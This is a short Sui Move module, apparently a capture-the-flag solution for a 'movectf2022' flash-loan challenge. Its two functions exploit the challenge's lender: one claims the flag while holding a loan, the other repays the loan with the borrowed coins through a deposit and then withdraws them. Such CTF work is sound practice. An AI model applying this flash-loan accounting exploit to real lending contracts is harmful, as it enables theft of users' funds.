/// Module: exp
module exp::exp {

    use sui::tx_context::TxContext;
    use movectf2022_flashloan::flash::{Self, FlashLender};

    public entry fun exp1(lender: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(lender, 1000, ctx);

        flash::get_flag(lender, ctx);

        flash::repay(lender, coin);
        flash::check(lender, receipt);
    }

    public entry fun exp2(lender: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(lender, 1000, ctx);

        flash::deposit(lender, coin, ctx);
        flash::check(lender, receipt);
        flash::withdraw(lender, 1000, ctx);

        flash::get_flag(lender, ctx);
    }

}
